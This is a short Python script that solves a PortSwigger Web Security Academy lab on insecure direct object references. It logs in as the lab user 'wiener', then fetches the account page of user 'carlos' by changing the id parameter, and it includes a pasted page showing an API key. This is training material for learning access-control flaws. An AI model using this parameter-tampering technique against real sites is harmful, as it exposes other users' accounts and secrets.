# Lab: User ID controlled by request parameter

import requests

base = "https://0aba00e7034db18580d33f0700a40042.web-security-academy.net"
s = requests.Session()

#r = s.get(base)
#print(r.text)

print(s.get(f"{base}/login").text)
csrf=input("input csrf: ")
r = s.post(f"{base}/login", data={"username": "wiener", "password": "peter", "csrf": csrf})
print(r.text)

'''
<a href="/my-account?id=wiener">My account</a><p>|</p>
                    <div id=account-content>
                        <p>Your username is: wiener</p>
                        <div>Your API Key is: HNqatV9QqVRfhKx3oWpWkwDvXnG6xleG</div><br/>
                        <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
                            <label>Email</label>
                            <input required type="email" name="email" value="">
                            <input required type="hidden" name="csrf" value="715XpnJWeByw8B6eQCMZyL0aFX8yzRVS">
                            <button class='button' type='submit'> Update email </button>
                        </form>
                    </div>
                </div>
'''
r = s.post(f"{base}/my-account?id=carlos", data={"username": "wiener", "password": "peter", "csrf": csrf})
print(r.text)

